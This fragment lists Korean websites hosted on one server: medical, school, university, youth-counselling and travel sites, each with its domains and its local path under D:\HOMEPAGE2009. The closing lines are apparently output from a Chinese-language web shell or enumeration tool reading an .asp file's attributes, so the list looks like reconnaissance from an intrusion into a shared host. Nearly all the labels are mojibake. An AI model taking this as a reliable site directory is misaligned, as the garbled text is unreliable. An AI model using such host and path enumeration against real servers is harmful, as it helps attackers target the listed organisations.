+297	Path            : D:\HOMEPAGE2009\ÇÐ±³\guseo1495	
+298		
+299	[¿Õ¼ö°Ç_½Ã¾È_umedical]	
+300	umedi.ox.or.kr	
+301	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\umedical_2010	
+302		
+303	[µ¥¸ð_¿¬ÃµÃ»¼Ò³â»ó´ã¼¾ÅÍ]	
+304	toktok.uzn.kr	
+305	Path            : D:\HOMEPAGE2009\DEMO\¿¬ÃµÃ»¼Ò³â»ó´ã¼¾ÅÍ	
+306		
+307	[±â°ü_µ¿µÎÃµÃ»¼Ò³â»ó´ã¼¾ÅÍ2009]	
+308	dyc1318.or.kr	
+309	www.dyc1318.or.kr	
+310	Path            : D:\HOMEPAGE2009\±â°ü\dyc1318_or_kr	
+311		
+312	[¿Õ¼ö°Ç_ºÎ»ê¿ï»êÁö¿ªÀÇ»çÇùÈ¸]	
+313	clinicalotolaryngology.net	
+314	www.clinicalotolaryngology.net	
+315	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\clinicalotolaryngology_net	
+316		
+317	[¿Õ¼ö°Ç_À¯¸ÞµðÄ®]	
+318	u-medical.co.kr	
+319	www.u-medical.co.kr	
+320	u-medical.net	
+321	www.u-medical.net	
+322	u-medical.org	
+323	www.u-medical.org	
+324	xn--hy1b26c8yav91b7yae41dzmb.kr	
+325	www.xn--hy1b26c8yav91b7yae41dzmb.kr	
+326	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\umedical_2010	
+327		
+328	[±â°ü_½º¸¶Æ®ÀüÀÚºÎÇ°±â¼úÁö¿ø¼¾ÅÍ]	
+329	smt.uzn.kr	
+330	smartsoc.or.kr	
+331	www.smartsoc.or.kr	
+332	Path            : D:\HOMEPAGE2009\±â°ü\½º¸¶Æ®ÀüÀÚºÎÇ°±â¼úÁö¿ø¼¾ÅÍ	
+333		
+334	[µ¥¸ð_ºÎ»ê´ë»ýÈ°È¯°æ´ë]	
+335	humanpusan.uzn.kr	
+336	Path            : D:\HOMEPAGE2009\DEMO\ºÎ»ê´ë »ýÈ°È¯°æ´ëÇÐ	
+337		
+338	[µ¥¸ð_ºÎ°æ´ëÀÚ°ú´ë]	
+339	pknu.ox.or.kr	
+340	Path            : D:\HOMEPAGE2009\DEMO\ºÎ°æ´ëÀÚ°ú´ë	
+341		
+342	[¿©Çà»ç_´ëÇÑ¿©Çà»ç]	
+343	koreatour.ox.or.kr	
+344	Path            : D:\HOMEPAGE2009\¿©Çà»ç\Âü»ç¶ûÅõ¾î	
+345		
+346	[ÇÐ±³_³²ÃµÁßÇÐ±³old]	
+347	namcheon.ox.or.kr	
+348	Path            : D:\HOMEPAGE2009\ÇÐ±³\namchun_5310	
+349		
+350	[ºÎ»ê´ë_Àç·á°øÇÐºÎ2009]	
+351	pusanmse.ox.or.kr	
+352	pusanmse2.ox.or.kr	
+353	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\ºÎ»ê´ëÇÐ±³Àç·á°øÇÐºÎ	
+354		
+355	[±â°ü_ºÎ»ê½ÃÃ»¼Ò³â»ó´ã¼¾ÅÍ]	
+356	cando.or.kr	
+357	www.cando.or.kr	
+358	Path            : D:\HOMEPAGE2009\±â°ü\cando5001_09	
+359		
+360	[±â°ü_Á¶°æÅÂÀÇ¿ø2009]	
+361	old.ktclub.or.kr	
+362	Path            : D:\HOMEPAGE2009\±â°ü\cho	
+363		
+364	[¿Õ¼ö°Ç_º¸ÀÌ½ºÃ¼Å©]	
+365	laryngealcancer.co.kr	
+366	www.laryngealcancer.co.kr	
+367	laryngealcancer.org	
+368	www.laryngealcancer.org	
+369	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\VoiceCheck	
+370		
+371	[¿Õ¼ö°Ç_umedical_new]	
+372	u-medical.co.kr	
+373	www.u-medical.co.kr	
+374	u-medical.net	
+375	www.u-medical.net	
+376	u-medical.org	
+377	www.u-medical.org	
+378	xn--hy1b26c8yav91b7yae41dzmb.kr	
+379	www.xn--hy1b26c8yav91b7yae41dzmb.kr	
+380	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\umedical_new	
+381		
+382	[ºÎ»ê´ë_¾ÈÀüÁ¤º¸¸Á]	
+383	labs.ox.or.kr	
+384	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\ºÎ»ê´ë¾ÈÀüÁ¤º¸¸Á	
+385		
+386	[ºÎ»ê±â°è°ø°í_¸ð¹ÙÀÏ]	
+387	bmtmobile.ox.or.kr	
+388	Path            : D:\HOMEPAGE2009\±â°ü\ºÎ»ê±â°è°ø°íÃÑµ¿Ã¢È¸	
+389		
+390	[¿ì¸®Áý_Á¤À¯´Ïºê(¿ìÆí¿ø°Ý±³À°)]	
+391	ju.ox.or.kr	
+392	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\Á¤À¯´Ïºê(¿ìÆí¿ø°Ý±³À°)	
+393		
+394	[µ¥¸ð_¾ÈÀüÁ¤º¸¸Á]	
+395	demolab.ox.or.kr	
+396	Path            : D:\HOMEPAGE2009\DEMO\¾ÈÀüÁ¤º¸¸Á	
+397		
+398	[µ¥¸ð_½Çµ¥ÀÌÅÍÁ¤À¯´Ïºê]	
+399	demopost2011.uzn.kr	
+400	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\½Çµ¥ÀÌÅÍ_Á¤À¯´Ïºê	
+401		
+¡öÕýÔÚ»ñÈ¡ÎÄ¼þÊôÐÔ£º
+ÎÄ¼þÃû:D:\HOMEPAGE2009\±â°ü\tong644\uc_net.asp
+ÎÄ¼þ´óÐ¡£º249344
+´´½¨Ê±¼ä£º20110405:163445
